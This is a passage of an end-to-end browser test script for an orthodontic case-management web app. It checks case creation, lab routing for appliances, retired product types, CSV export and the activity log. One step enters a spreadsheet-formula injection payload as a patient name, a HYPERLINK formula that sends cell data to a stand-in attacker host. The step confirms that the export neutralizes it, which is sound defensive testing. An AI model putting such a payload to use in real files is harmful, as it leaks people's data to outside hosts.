  await owner.click('.kc:has-text("Fiona Finisher")'); await owner.waitForSelector('#drawer .tc.ro');
  check(await owner.isVisible('#drawer .txt:has-text("Implant: UL6")') && (await owner.locator('#drawer .tc.ro .tooth.m-noatt').count()) === 11, 'case view shows the chart and its summary');
  await owner.click('#drawer [data-act=edit]'); await owner.waitForSelector('#drawer .cf');
  check((await owner.getAttribute('#drawer .tt[data-tile=finishing]', 'aria-checked')) === 'true', 'editing keeps it as Finishing aligners');
  check(await owner.isVisible('#drawer .tooth.m-implant[data-t=UL6]'), 'editing restores the tooth chart');
  await owner.click('#drawer [data-act=cancelEdit]'); await owner.click('#drawer [data-act=closeDrawer] >> nth=0');

  console.log('\n# Mouthguard (in-house, complimentary)');
  await owner.click('.topBar [data-act=newCase]'); await owner.waitForSelector('#ncForm');
  await owner.click('#ncForm .tt[data-tile=mouthguard]'); await owner.fill('#cf-patient', 'Milo Guardsman');
  check(await owner.isVisible('.pickRow[data-g=arches]') && !(await owner.isVisible('.pickRow[data-g=retKinds]')), 'asks for the arch, not TT’s/WT’s');
  check(!(await owner.isVisible('.pickRow[data-g=initial]')), 'no refinement question for a mouthguard');
  await owner.click('.pickRow[data-g=arches] .pick[data-v=Upper]');
  check(await owner.inputValue('#cf-detail') === 'Mouthguard (U)', 'detail reads Mouthguard (U)');
  check(await owner.inputValue('#cf-dueDate') === await owner.evaluate(() => addClinicDays(todayISO(), 2)), 'due in two clinic days, like retainers');
  check(await owner.inputValue('#cf-assignee') === await owner.evaluate(() => meSid()), 'assigned to whoever creates it');
  await owner.click('#ncSave'); await owner.waitForSelector('#modalWrap', { state: 'detached', timeout: 20000 });
  await owner.click('#nav-board'); await owner.fill('#q', ''); await owner.click('[data-act=flow][data-k=retainer]');
  await owner.waitForSelector('section[aria-label="Printing"] .kc:has-text("Milo Guardsman") .badge:has-text("Mouthguard")', { timeout: 20000 });
  check(true, 'lands on the retainers & mouthguards board at Printing, marked Mouthguard');

  console.log('\n# Appliances: the lab is picked from the office routing');
  const labNow = async () => (await owner.locator('.pickRow[data-g=lab] .pick[aria-pressed=true]').allTextContents()).join('|');
  const tapAppl = v => owner.click('.pickRow[data-g=appliances] .pick[data-v="' + v + '"]');
  await owner.click('.topBar [data-act=newCase]'); await owner.waitForSelector('#ncForm');
  await owner.click('#ncForm .tt[data-tile=appliance]'); await owner.fill('#cf-patient', 'Dmitri Distalson');
  check(!(await owner.isVisible('.pickRow[data-g=initial]')) && !(await owner.isVisible('.pickRow[data-g=initialDE]')), 'no refinement question for appliances');
  await tapAppl('MSE'); check(await labNow() === 'Specialty Orthodontic Lab', 'MSE → Specialty Orthodontic Lab');
  await tapAppl('MSE'); await tapAppl('MARPE'); check(await labNow() === 'Partner Dental Studios', 'MARPE → Partner Dental Studios');
  await tapAppl('MARPE'); await tapAppl('MARA'); check(await labNow() === 'Specialty Orthodontic Lab', 'MARA → Specialty Orthodontic Lab');
  await tapAppl('MARA'); await tapAppl('D2 distalizer'); check(await labNow() === 'In-house (NL Lab)', 'D2 distalizer → in-house (NL Lab)');
  check(await owner.inputValue('#cf-stage') === 'mfg' && await owner.inputValue('#cf-assignee') === await owner.evaluate(() => meSid()), 'in-house D2 starts in Manufacturing with Dr. A');
  await tapAppl('MSE'); check(/different labs/.test(await owner.textContent('#cf-labHint')), 'mixing labs says to make one case per lab');
  await tapAppl('MSE');
  await owner.click('#ncForm .tt[data-tile=oliv]'); await owner.click('#ncForm .tt[data-tile=appliance]');
  check(await labNow() === 'In-house (NL Lab)' && await owner.inputValue('#cf-stage') === 'mfg', 'switching type and back keeps the D2 routing');
  check(await owner.inputValue('#cf-detail') === 'D2 distalizer', 'detail reads D2 distalizer');
  await owner.click('#ncSave'); await owner.waitForSelector('#modalWrap', { state: 'detached', timeout: 20000 });
  await openByName(owner, 'Dmitri Distalson');
  check(await owner.isVisible('#drawer .badge:has-text("In-house (NL Lab)")') && await owner.isVisible('#drawer .badge:has-text("D2 distalizer")'), 'case shows the appliance and its lab');
  await owner.click('#drawer [data-act=closeDrawer] >> nth=0');
  await owner.click('.topBar [data-act=newCase]'); await owner.waitForSelector('#ncForm');
  await owner.click('#ncForm .tt[data-tile=appliance]');
  await owner.click('.pickRow[data-g=lab] .pick[data-v="Partner Dental Studios"]'); await tapAppl('MSE');
  check(await labNow() === 'Partner Dental Studios', 'a lab tapped by hand is kept');
  await owner.mouse.click(5, 5);
  check(await owner.isVisible('#ncForm'), 'a stray click outside the form does not throw it away');
  await owner.click('.modal [data-act=closeModal]');

  console.log('\n# InSmile: digital enhancements instead of refinements');
  await owner.click('.topBar [data-act=newCase]'); await owner.waitForSelector('#ncForm');
  await owner.click('#ncForm .tt[data-tile=insmile]'); await owner.fill('#cf-patient', 'Ines Smilewright');
  check(await owner.isVisible('.pickRow[data-g=initialDE]') && !(await owner.isVisible('.pickRow[data-g=initial]')), 'asks Initial / DE 1 / DE 2 / DE 3 instead of refinement');
  check(!(await owner.isVisible('.pickRow[data-g=instrPicks] .pick[data-v="Aligners are not tracking well"]')) && await owner.isVisible('.pickRow[data-g=instrPicks] .pick[data-v="Resolve black triangles"]') && await owner.isVisible('.pickRow[data-g=goal_ap]'), 'aligner-only pictures hidden for braces; AP and the rest stay');
  check(!(await owner.isVisible('#cf-tc')), 'no aligner tooth chart for braces');
  await owner.click('.pickRow[data-g=initialDE] .pick[data-v=de2]');
  check(await owner.inputValue('#cf-detail') === 'InSmile braces – DE2', 'detail reads InSmile braces – DE2');
  check(await owner.inputValue('#cf-assignee') === await owner.evaluate(() => meSid()), 'InSmile assigned to whoever creates it');
  await owner.click('#ncSave'); await owner.waitForSelector('#modalWrap', { state: 'detached', timeout: 20000 });
  await openByName(owner, 'Ines Smilewright');
  check(await owner.isVisible('#drawer .badge:has-text("Digital enhancement 2 (DE2)")') && !(await owner.isVisible('#drawer .badge:has-text("Refinement")')), 'case shows Digital enhancement 2 (DE2)');
  await owner.click('#drawer [data-act=edit]'); await owner.waitForSelector('#drawer .cf');
  check((await owner.getAttribute('#drawer .pickRow[data-g=initialDE] .pick[data-v=de2]', 'aria-pressed')) === 'true', 'editing keeps DE 2');
  await owner.click('#drawer [data-act=cancelEdit]'); await owner.click('#drawer [data-act=closeDrawer] >> nth=0');

  console.log('\n# InBrace/Brava retired; InSmile stays');
  await owner.click('.topBar [data-act=newCase]'); await owner.waitForSelector('#ncForm');
  check((await owner.locator('#ncForm .tt[data-tile=inbrace]').count()) === 0 && await owner.isVisible('#ncForm .tt[data-tile=insmile]'), 'New case has no InBrace/Brava button; InSmile is still there');
  await owner.click('.modal [data-act=closeModal]');
  await owner.click('#nav-list'); await owner.fill('#q', '');
  check((await owner.locator('select[data-f=type] option[value=inbrace]').count()) === 0, 'the type filter doesn’t offer InBrace when no case uses it');
  // an older InBrace case (say, imported from Asana) still opens and edits
  await owner.evaluate(() => B.createCase({ type: 'inbrace', patient: 'Leona Legacycase', stage: 'dra', detail: 'InBrace IDB', comments: [], createdAt: Date.now(), createdBy: meSid() }));
  await openByName(owner, 'Leona Legacycase');
  await owner.click('#drawer [data-act=edit]'); await owner.waitForSelector('#drawer .cf');
  check((await owner.getAttribute('#drawer .tt[data-tile=inbrace]', 'aria-checked')) === 'true' && (await owner.locator('#drawer .tt[data-tile]').count()) === (await owner.evaluate(() => TILES.length)), 'an older InBrace case still edits as InBrace');
  await owner.fill('#drawer #cf-notes', 'legacy-edit-ok');
  await owner.click('[data-act=saveEdit]'); await owner.waitForSelector('#drawer .stepper', { timeout: 20000 });
  check(await owner.isVisible('#drawer .dHd .badge:has-text("InBrace")') && await owner.isVisible('#drawer .txt:has-text("legacy-edit-ok")'), 'saving keeps it InBrace with the change');
  await owner.click('#drawer [data-act=closeDrawer] >> nth=0');
  check((await owner.locator('select[data-f=type] option[value=inbrace]').count()) === 1, 'the filter offers InBrace while such a case is open');

  console.log('\n# Next Level Express retired');
  await owner.click('.topBar [data-act=newCase]'); await owner.waitForSelector('#ncForm');
  await owner.click('#ncForm .tt[data-tile=oliv]');
  check(await owner.isVisible('.pickRow[data-g=extras] .pick:has-text("No elastics")') && (await owner.locator('.pickRow[data-g=extras] .pick:has-text("Next Level Express")').count()) === 0, 'New case has no Next Level Express button');
  await owner.click('.modal [data-act=closeModal]');
  await owner.evaluate(() => B.createCase({ type: 'oliv', patient: 'Nora Expressold', stage: 'submit', extras: ['Next Level Express (5 aligners or less)'], comments: [], createdAt: Date.now(), createdBy: meSid() }));
  await openByName(owner, 'Nora Expressold');
  await owner.click('#drawer [data-act=edit]'); await owner.waitForSelector('#drawer .cf');
  check((await owner.getAttribute('#drawer .pickRow[data-g=extras] .pick:has-text("Next Level Express")', 'aria-pressed')) === 'true', 'an older case keeps its Next Level Express choice when edited');
  await owner.fill('#drawer #cf-notes', 'express-edit-ok');
  await owner.click('[data-act=saveEdit]'); await owner.waitForSelector('#drawer .stepper', { timeout: 20000 });
  check(await owner.isVisible('#drawer .badge:has-text("Next Level Express")') && await owner.isVisible('#drawer .txt:has-text("express-edit-ok")'), 'saving the edit doesn’t drop it');
  await owner.click('#drawer [data-act=closeDrawer] >> nth=0');

  console.log('\n# Spreadsheet-formula text is neutralized in the export');
  await owner.fill('#q', ''); await newCase(owner, { type: 'misc', patient: '=HYPERLINK("http://evil.example/?"&A1,"x")' });

  console.log('\n# Export');
  await owner.click('#nav-import');
  const [dl] = await Promise.all([owner.waitForEvent('download', { timeout: 30000 }), (async () => { await owner.click('[data-act=exportCSV]'); await owner.click('#cbYes'); })()]);
  const exp = fs.readFileSync(await dl.path(), 'utf8');
  check(exp.includes(P1) && exp.includes(P2) && exp.includes('Imogen Fakeworth'), 'export includes open and completed cases');
  check(exp.includes('"\'=HYPERLINK(') && !/(^|,)"=HYPERLINK/m.test(exp), 'formula-looking text is exported as plain text');
  check(exp.includes('Digital enhancement 2 (DE2)') && exp.includes('Mouthguard (U)'), 'export carries DE and mouthguard details');

  console.log('\n# Activity');
  await owner.click('#nav-admin'); await owner.click('[data-act=loadActivity]');
  await owner.waitForSelector('#actBox .hist', { timeout: 20000 });
  check((await owner.locator('#actBox .hist').count()) >= 5, 'activity log lists recent changes');

  await owner.screenshot({ path: 'shots/e2e-admin.png', fullPage: true });
  // 403s are checked precisely (by section) in the forbidden list below
  const realErrs = errs.filter(e => !/Failed to load resource.*(404|fonts)|net::ERR|status of 400|status of 403|identitytoolkit|INVALID_LOGIN_CREDENTIALS|permission|insufficient permissions/i.test(e));
  check(realErrs.length === 0, 'no unexpected page errors' + (realErrs.length ? ':\n' + realErrs.join('\n') : ''));
  console.log('\nexpected-noise errors:', errs.length - realErrs.length);
  console.log('403s:\n' + forbidden.join('\n'));
  const unexpected403 = forbidden.filter(f => !/Two people edit/.test(f));
  check(unexpected403.length === 0, 'no request was refused by the security rules during normal use (' + unexpected403.length + '; ' + (forbidden.length - unexpected403.length) + ' expected during the deliberate same-moment edit, retried automatically)');
  console.log('\nPASS ' + passes.length + '  FAIL ' + fails.length);
  await browser.close();
  process.exit(fails.length ? 1 : 0);
})().catch(async e => { console.error('CRASH', e); try { for (const pg of (global.__pages || [])) console.error('PAGE', pg.l, (await pg.p.textContent('#lockCard').catch(() => '')).slice(0, 300), '|', (await pg.p.textContent('#view').catch(() => '')).slice(0, 200)); } catch (x) { } console.error('ERRS', (global.__errs || []).join('\n')); process.exit(2); });
